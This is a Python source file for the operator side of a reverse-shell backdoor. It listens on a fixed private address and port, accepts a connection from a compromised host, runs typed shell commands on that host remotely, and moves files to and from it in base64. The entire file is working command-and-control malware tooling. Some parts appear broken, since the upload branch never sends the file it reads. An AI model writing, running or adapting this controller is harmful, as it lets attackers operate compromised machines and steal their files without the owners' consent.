import socket
import json
import sys
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connections")
        self.connection, address = listener.accept()

        print(f"[!] Got a connection from {address}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

        if data == 'exit':
            print('[!] Connection close.')
            self.connection.close()
            sys.exit()

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def executable_remotely(self, command):
        self.reliable_send(command)

        if command[0] == 'exit':
            print('[!] Connection close.')
            self.connection.close()
            sys.exit()

        return self.reliable_receive()

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful!"

    def run(self):
        while True:
            command = input(">> ")
            command_list = command.split(" ")

            try:
                if command_list[0] == 'upload':
                    file_content = self.read_file(command_list[1])

                result = self.executable_remotely(command_list)

                if command_list[0] == 'download' and '[-] Error' not in result:
                    result = self.write_file(command_list[1], result)

            except Exception:
                result = "[-] Error in program process."

            print(result)


my_client = Listener("10.211.55.2", 8080)
my_client.run()
